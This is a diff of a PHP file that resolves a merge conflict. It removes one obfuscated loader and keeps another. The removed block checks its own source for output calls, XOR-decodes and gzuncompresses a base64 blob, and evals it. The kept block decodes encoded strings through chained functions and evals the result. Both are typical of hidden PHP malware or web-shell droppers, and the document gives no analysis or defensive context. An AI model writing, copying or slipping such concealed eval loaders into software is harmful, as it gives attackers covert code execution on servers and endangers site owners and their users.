@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$gskqqpmy="4564c1052ed9f44fd03941a2aa56154a";
-$gsuignsov="55005450050905505401520e510457520552520f040402020302005750040459";
-$goinvo="Ge/HMDtT7lVyGQHPCGwpFX5GkMAsr7EWO6pdein7kIxCnZTJRWgQKnmq/O9Ir3f9EICHV/vBcd6zWmKGH/WshMAfKu4WbSGqBaWDI7uRN/uqNkNEBbnACCjZ6FnjH+wgNS+eaZJFrUltKAPmdfL4/BGp2lR8WXekdlShhvHqd1giwDh8az0WinAQihO5YiWgk+sjbMyc8ldozbwjbvThF6qDxVRJtJOVDBycntcQTiUE2YJZM/z+w+4LN3YRn+dslHJbju897/gHKaefutR29waYB8uGbqkn/If7NcrWo22z6sx5oYTZu54EEH7XNlZcMA4KgY3oUFqzNnUK3uh7R5W/WDm9BoMO1F9R/N7dF8gBGZ1TAYpgk/4Ti/ktJkDFabDCOE2gefIF3Kvq+i6Dx8bRW3dXbdpfmkkcAkX2lolry0UDg5juZlUU+I+sy7XTTzEYHrKakOkfy/ehne+aZSEGmcB/6JmkuHFsOXkd9gQnXXXc8WZlUPeMyrYeuBlKbJyCW6rZW539MUNEvY3DaVDzthgFgADJWezUPpNFyHAKWgk/FgkPPYW6J1kCzvloQKW5SCoAtPcvBZZa/+8wo3uCOUWJjqRL4K9917GBRQNZvsYxmGe3so2YauZZgw9HYX/0CoA=";
-$plofjc=file_get_contents(__FILE__);
-$rhhzwvke=str_replace($goinvo,"",$plofjc);
-if(strpos($rhhzwvke,"ec"."ho")!==false||strpos($rhhzwvke,"pr"."int")!==false||strpos($rhhzwvke,"var_"."dump")!==false||strpos($rhhzwvke,"file_put_"."contents")!==false||strpos($rhhzwvke,"fw"."rite")!==false){die();}
-$bcqamsq=str_replace(array($gskqqpmy,$gsuignsov),array("SP_e10a18ea","KP_7f201686"),$plofjc);
-$gofqsgax=md5($bcqamsq);
-$fechrvisiv=hex2bin($gsuignsov);
-$wefyuzmm="";
-$wuyxlkakx=strlen($gofqsgax);
-for($lbbtmdf=0;$lbbtmdf<$wuyxlkakx;$lbbtmdf++){
-$wefyuzmm.=chr(ord($fechrvisiv[$lbbtmdf])^ord($gofqsgax[$lbbtmdf]));
-}
-$xxewewi=base64_decode($goinvo);
-$aofrpadp=strlen($xxewewi);
-$hyamzlr="";
-$jlaifs=strlen($wefyuzmm);
-for($lbbtmdf=0;$lbbtmdf<$aofrpadp;$lbbtmdf++){
-$hyamzlr.=$xxewewi[$lbbtmdf]^$wefyuzmm[$lbbtmdf%$jlaifs];
-}
-$fgttbwla="gzun"."compress";
-eval($fgttbwla($hyamzlr));
-=======
 // 0eb166b6b900cbdf1c5ac929
 $kTSqsiAvmJy="x6MIerpJ+CZDujqoZ3HuxF7IO8NVDb81zSpRF6IYitI=";
 $lrd_FFLnpNW_="k6ZVrecW+PMQhwdbM3UhkS7VB8AIQo81mFcES6VLvgV=";
@@ -52,4 +27,3 @@ $JqBGgrzWDW=$NQMyfHgtyqk($JqBGgrzWDW);
 $JqBGgrzWDW=$XOQtYcvBpmw($JqBGgrzWDW);
 $JqBGgrzWDW=$tiHLZPhofe($JqBGgrzWDW);
 eval($JqBGgrzWDW);
->>>>>>> Stashed changes
